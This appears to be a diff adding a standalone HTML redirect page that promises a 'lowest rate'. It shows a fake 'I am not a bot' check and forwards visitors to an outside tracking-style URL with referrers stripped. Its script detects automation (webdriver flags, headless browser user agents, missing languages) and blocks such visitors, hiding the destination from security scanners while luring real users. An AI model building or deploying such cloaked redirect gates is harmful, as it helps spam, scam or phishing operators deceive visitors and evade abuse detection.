@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Continue</title>
+
+  <!-- Disable referrer completely -->
+  <meta name="referrer" content="no-referrer" />
+
+  <style>
+    body{
+      margin:0;
+      font-family: "Segoe UI", Arial, sans-serif;
+      background:#f7f7f8;
+      color:#222;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      height:100vh;
+      text-align:center;
+      padding:20px;
+      box-sizing:border-box;
+    }
+    .card{
+      background:white;
+      border-radius:12px;
+      box-shadow:0 6px 30px rgba(0,0,0,0.08);
+      padding:28px;
+      max-width:620px;
+      width:100%;
+    }
+    h1{ font-size:20px; margin:0 0 12px; }
+    p{ color:#666; margin:0 0 18px; }
+    .controls{ display:flex; gap:12px; justify-content:center; align-items:center; flex-wrap:wrap; }
+    .btn{
+      padding:12px 22px;
+      border-radius:8px;
+      background:#007bff;
+      color:white;
+      text-decoration:none;
+      font-weight:600;
+      cursor:pointer;
+      border:none;
+      font-size:15px;
+    }
+    .btn[disabled]{ background:#9fbdf7; cursor:not-allowed; }
+    .note{ margin-top:14px; font-size:13px; color:#888; }
+    .warning{ color:#b33; margin-top:14px; font-weight:600; }
+    .checkbox-label{ display:inline-flex; gap:8px; align-items:center; cursor:pointer; user-select:none; }
+    input[type="checkbox"]{ width:18px; height:18px; }
+  </style>
+</head>
+<body>
+  <div class="card" role="main" aria-labelledby="title">
+    <h1 id="title">Continue to claim your lowest rate now.</h1>
+    <p>To protect this page from automated traffic, please confirm you’re human before continuing.</p>
+
+    <div style="margin-bottom:14px;">
+      <label class="checkbox-label">
+        <input id="humanCheck" type="checkbox" aria-label="I am not a bot" />
+        <span>I am not a bot</span>
+      </label>
+    </div>
+
+    <div class="controls">
+      <button id="continueBtn" class="btn" disabled aria-disabled="true">Continue</button>
+      <button id="openNewTab" class="btn" disabled aria-disabled="true">Open in new tab</button>
+    </div>
+
+    <p class="note" id="status">Move your mouse or press a key to activate the button.</p>
+    <p class="warning" id="blockMsg" style="display:none;"></p>
+  </div>
+
+  <script>
+    (function(){
+      const TARGET = "https://www.therebths.com/9HF976T/2QGQGSP6/";
+      const MIN_HUMAN_TIME_MS = 2000;
+      let userInteracted = false;
+      let humanTimeStart = Date.now();
+      let humanTimerOk = false;
+
+      const btn = document.getElementById("continueBtn");
+      const openNew = document.getElementById("openNewTab");
+      const chk = document.getElementById("humanCheck");
+      const status = document.getElementById("status");
+      const blockMsg = document.getElementById("blockMsg");
+
+      function isEnvironmentSuspicious(){
+        const webdriver = !!navigator.webdriver;
+        const hasPlugins = navigator.plugins && navigator.plugins.length > 0;
+        const hasLanguages = navigator.languages && navigator.languages.length > 0;
+        const userAgent = navigator.userAgent || "";
+        const headlessIndicators = /HeadlessChrome|PhantomJS|slimerjs/i.test(userAgent);
+        if (webdriver || !hasLanguages || headlessIndicators) return true;
+        return false;
+      }
+
+      function markHuman(){
+        if(userInteracted) return;
+        userInteracted = true;
+        humanTimeStart = Date.now();
+        status.textContent = "Detected activity... please wait a moment.";
+        setTimeout(() => {
+          humanTimerOk = true;
+          updateControls();
+        }, MIN_HUMAN_TIME_MS);
+      }
+
+      function updateControls(){
+        if (isEnvironmentSuspicious()) {
+          blockMsg.style.display = "block";
+          blockMsg.textContent = "Suspicious environment detected. Please use a regular browser.";
+          btn.disabled = true;
+          openNew.disabled = true;
+          return;
+        }
+
+        if (userInteracted && humanTimerOk && chk.checked) {
+          btn.disabled = false;
+          openNew.disabled = false;
+          status.textContent = "You can now continue.";
+        } else {
+          btn.disabled = true;
+          openNew.disabled = true;
+        }
+      }
+
+      ["mousemove","keydown","touchstart","scroll"].forEach(evt=>{
+        window.addEventListener(evt, markHuman, {passive:true});
+      });
+
+      chk.addEventListener("change", updateControls);
+
+      btn.addEventListener("click", function(e){
+        e.preventDefault();
+        if (btn.disabled) return;
+        if (isEnvironmentSuspicious()){
+          blockMsg.style.display = "block";
+          blockMsg.textContent = "Suspicious environment detected.";
+          return;
+        }
+        window.location.href = TARGET;
+      });
+
+      openNew.addEventListener("click", function(e){
+        e.preventDefault();
+        if (openNew.disabled) return;
+        if (isEnvironmentSuspicious()){
+          blockMsg.style.display = "block";
+          blockMsg.textContent = "Suspicious environment detected.";
+          return;
+        }
+        const a = document.createElement("a");
+        a.href = TARGET;
+        a.target = "_blank";
+        a.rel = "noreferrer noopener";
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+      });
+
+      setInterval(updateControls, 300);
+
+      if (isEnvironmentSuspicious()){
+        status.textContent = "Checking environment... please use a normal browser if you face issues.";
+      }
+    })();
+  </script>
+</body>
+</html>
